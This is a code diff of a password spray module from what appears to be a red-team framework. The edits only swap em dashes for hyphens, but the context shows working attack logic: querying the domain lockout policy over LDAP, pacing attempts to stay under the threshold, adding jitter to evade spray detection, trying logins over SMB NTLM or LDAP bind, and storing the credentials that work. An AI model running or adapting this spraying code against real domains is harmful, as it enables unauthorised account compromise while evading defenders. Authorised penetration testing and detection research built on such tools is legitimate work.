@@ -1,5 +1,5 @@
 """
-Password Spray — Low-and-Slow Authentication Testing
+Password Spray - Low-and-Slow Authentication Testing
 MITRE: T1110.003
 
 Tries ONE password against MANY accounts to avoid lockouts.
@@ -52,13 +52,13 @@ def query_password_policy(
     Uses this to auto-calculate the safest spray rate.
 
     Returns dict with:
-        lockout_threshold       — max failed attempts before lockout (0 = no lockout)
-        lockout_duration_min    — minutes until auto-unlock
-        observation_window_min  — minutes before failed-attempt counter resets
-        min_password_length     — minimum password length enforced
-        password_history_length — number of remembered passwords
-        safe_spray_delay_s      — calculated safe delay between attempts per user
-        safe_attempts_per_user  — max attempts per user before lockout risk
+        lockout_threshold       - max failed attempts before lockout (0 = no lockout)
+        lockout_duration_min    - minutes until auto-unlock
+        observation_window_min  - minutes before failed-attempt counter resets
+        min_password_length     - minimum password length enforced
+        password_history_length - number of remembered passwords
+        safe_spray_delay_s      - calculated safe delay between attempts per user
+        safe_attempts_per_user  - max attempts per user before lockout risk
     """
     result: dict[str, Any] = {"error": None, "policy_found": False}
     try:
@@ -80,7 +80,7 @@ def query_password_policy(
             except Exception:
                 conn = None
         if not conn:
-            result["error"] = "LDAP bind failed — cannot query password policy"
+            result["error"] = "LDAP bind failed - cannot query password policy"
             return result
 
         base_dn = ",".join(f"DC={p}" for p in domain.upper().split("."))
@@ -110,7 +110,7 @@ def query_password_policy(
 
             # Calculate safe spray parameters
             if threshold == 0:
-                safe_attempts = 10   # no lockout policy — still be cautious
+                safe_attempts = 10   # no lockout policy - still be cautious
                 safe_delay    = 5.0
             else:
                 safe_attempts = max(1, threshold - 2)  # stay 2 below threshold
@@ -229,7 +229,7 @@ def generate_smart_wordlist(
 )
 class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
     """
-    credential.pass_spray — Low-and-slow password spray against domain accounts — built-in lockout protection, one password 
+    credential.pass_spray - Low-and-slow password spray against domain accounts - built-in lockout protection, one password 
 
     OPSEC: MEDIUM
     MITRE: "T1110.003"
@@ -240,7 +240,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
     MODULE_NAME        = "Password Spray"
     MODULE_CATEGORY    = "credential"
     MODULE_DESCRIPTION = (
-        "Low-and-slow password spray against domain accounts — "
+        "Low-and-slow password spray against domain accounts - "
         "built-in lockout protection, one password per round"
     )
     MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
@@ -282,7 +282,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
         if noise == NoiseProfile.STEALTH:
             score = 0.35
             risk = "high_noise"
-            blockers.append("Password spraying generates rapid Event ID 4625 failed logins — strictly blocked in STEALTH mode")
+            blockers.append("Password spraying generates rapid Event ID 4625 failed logins - strictly blocked in STEALTH mode")
             opsec_tuning["note"] = (
                 "Password spraying in STEALTH profile creates Event ID 4625 failed logons. "
                 "Recommend offline cracking techniques that never touch target authenticators."
@@ -300,7 +300,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
                     or (isinstance(threshold, (int, float)) and threshold <= 5)
                 )
                 if is_strict:
-                    blockers.append("Strict lockout policy detected (threshold <= 5) — password spraying blocked to avoid account lockouts")
+                    blockers.append("Strict lockout policy detected (threshold <= 5) - password spraying blocked to avoid account lockouts")
                     score = 0.1
                     risk = "critical_alarm"
                     opsec_tuning["safe_spray_rate"] = "1 attempt per 45 minutes"
@@ -339,12 +339,12 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
         passwords = ctx.params.get("passwords", [])
         if not target:
             raise ModuleValidationError(
-                "credential.pass_spray requires 'target' — DC IP or hostname.",
+                "credential.pass_spray requires 'target' - DC IP or hostname.",
                 module_id=self.MODULE_ID, field="target",
             )
         if not users:
             raise ModuleValidationError(
-                "credential.pass_spray requires 'users' list — "
+                "credential.pass_spray requires 'users' list - "
                 "provide via params or pipe from ad.enum_users output.",
                 module_id=self.MODULE_ID, field="users",
             )
@@ -459,7 +459,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
         dry_run      = kwargs.get("dry_run", False)
         delay_s      = float(kwargs.get("delay_seconds", 1.0))
         max_per_user = int(kwargs.get("max_attempts_per_user", 1))
-        # LDAP mode: use ldap3 SIMPLE bind instead of SMB — fallback when port 445 blocked
+        # LDAP mode: use ldap3 SIMPLE bind instead of SMB - fallback when port 445 blocked
         use_ldap     = bool(kwargs.get("use_ldap", False))
         ldap_port    = int(kwargs.get("ldap_port", 389))
 
@@ -477,7 +477,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
                 from impacket.smbconnection import SMBConnection  # type: ignore[import]
                 smb_available = True
             except ImportError:
-                use_ldap = True   # impacket missing — try ldap3
+                use_ldap = True   # impacket missing - try ldap3
 
         if use_ldap or not smb_available:
             try:
@@ -508,14 +508,14 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
 
                 # Rate limiting per attempt to strictly respect LDAP/SMB noise profile & avoid lockout
                 await self.noise.rate_limiter.acquire(rate_bucket)
-                # Jitter — random timing variation prevents regular spray pattern detection
+                # Jitter - random timing variation prevents regular spray pattern detection
                 await self.noise.jitter.sleep()
                 if delay_s > 0:
                     await asyncio.sleep(delay_s)
 
                 def _try_login(u=user, p=password):
                     if use_ldap:
-                        # LDAP SIMPLE bind — fallback when SMB 445 is blocked
+                        # LDAP SIMPLE bind - fallback when SMB 445 is blocked
                         try:
                             import ldap3
                             import ssl
@@ -526,7 +526,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
                                 use_ssl=use_ssl, tls=tls_arg,
                                 connect_timeout=8,
                             )
-                            # SIMPLE bind — UPN format: user@domain
+                            # SIMPLE bind - UPN format: user@domain
                             upn  = f"{u}@{domain}" if domain else u
                             conn = ldap3.Connection(
                                 server, user=upn, password=p,
@@ -549,7 +549,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
                                 return "locked"
                             return "wrong_password"
                     else:
-                        # SMB NTLM spray — standard mode
+                        # SMB NTLM spray - standard mode
                         try:
                             from impacket.smbconnection import SMBConnection
                             smb = SMBConnection(target, target, timeout=8)
@@ -586,7 +586,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
 
         if valid_creds:
             for cred in valid_creds:
-                # Store credential in vault — password NEVER appears in finding
+                # Store credential in vault - password NEVER appears in finding
                 vault_id = ""
                 try:
                     from ares.credential.vault import Credential, CredentialType, PrivilegeLevel
@@ -601,7 +601,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
                         )
                         vault_id = vault.store(vc, secret=cred["password"])
                 except Exception:
-                    pass  # vault unavailable — credential still in raw output for engine
+                    pass  # vault unavailable - credential still in raw output for engine
 
                 self.finding(
                     title=f"Password Spray Success: {domain}\\{cred['username']}",
@@ -630,7 +630,7 @@ class PassSprayModule(BaseModule[PassSprayParams, ModuleResult]):
 
         if locked_accounts:
             self.finding(
-                title=f"Account Lockout Detected During Spray — {len(locked_accounts)} Account(s)",
+                title=f"Account Lockout Detected During Spray - {len(locked_accounts)} Account(s)",
                 description=(
                     f"Password spray caused lockout for: {locked_accounts}. "
                     "Spray was stopped to prevent further lockouts."
